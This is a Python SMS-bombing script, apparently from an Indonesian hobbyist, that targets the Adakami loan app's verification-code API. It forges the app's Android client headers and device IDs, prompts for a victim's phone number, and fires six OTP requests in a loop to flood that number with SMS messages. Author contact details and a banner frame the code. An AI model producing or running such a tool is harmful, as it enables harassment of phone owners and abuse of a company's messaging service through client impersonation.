# -*- coding: utf-8 -*-
import requests, json, sys, os


hd = {
	"content-type": "application/json; charset=UTF-8",
	"content-length": "34",
	"accept-encoding": "gzip",
	"user-agent": "okhttp/3.8.0",
	"accept-language": "in",
	"x-ada-token": "",
	"x-ada-appid": "800006",
	"x-ada-os": "android",
	"x-ada-channel": "default",
	"x-ada-mediasource": "",
	"x-ada-agency": "adtubeagency",
	"x-ada-campaign": "AdakamiCampaign",
	"x-ada-role": "1",
	"x-ada-appversion": "1.7.0",
	"x-ada-device": "",
	"x-ada-model": "SM-G935FD",
	"x-ada-os-ver": "7.1.1",
	"x-ada-androidid": "a4341a2sa90a4d97",
	"x-ada-aid": "c7bbb23d-a220-4d43-9caf-153608f9bd39",
	"x-ada-afid": "1580054114839-7395423911531673296",
}
os.system('cls' if os.name == 'nt' else 'clear')
print("""\n██   ██▄   ██   █  █▀ ██   █▀▄▀█ ▄█ 
█ █  █  █  █ █  █▄█   █ █  █ █ █ ██ 
█▄▄█ █   █ █▄▄█ █▀▄   █▄▄█ █ ▄ █ ██ 
█  █ █  █  █  █ █  █  █  █ █   █ ▐█ 
   █ ███▀     █   █      █    █   ▐ 
  █          █   ▀      █    ▀      
 ▀          ▀          ▀            \n""")
os.system("echo x•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••x | lolcat -a")
os.system("echo Nama Tool: Spam Sms Adakami | lolcat -a")
os.system("echo Author: N4B1Lx75 | lolcat -a")
os.system("echo Whatsapp: +628811883541 | lolcat -a")
os.system("echo Github: https://github.com/AbilSeno | lolcat -a")
os.system("echo Youtube: Nothing | lolcat -a")
os.system("echo x•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••x | lolcat -a")
print("[!] LIMIT : 5 SMS PER NOMOR/1 hari")
no = input("[!] Contoh : 088xxxx\n[?] Masukkan nomor target : ")
dat = {"ketik":0,"nomor":no}
datjson = json.dumps(dat)
r = requests.Session()
print(" ")
for x in range(6):
	try:
		a = r.post("https://api.adakami.id/adaKredit/pesan/kodeVerifikasi",data=datjson,headers=hd,timeout=10).text
		if a == '{"result":-1,"resultMessage":"Permintaan kode verifikasi sudah melebihi batas. Silakan coba lagi besok.","content":null}':
			print(f"[!] [Limit Harian] [Coba lagi besok]")
		elif a == '{"result":-1,"resultMessage":"Gagal","content":null}':
			print(f"[•] [Gagal] [Nomor hp invalid!]")
		else:
			print(f"[✓] [Success] Spam to {no}")
	except requests.exceptions.ConnectionError:
		print("[~] Uppss, koneksi error")
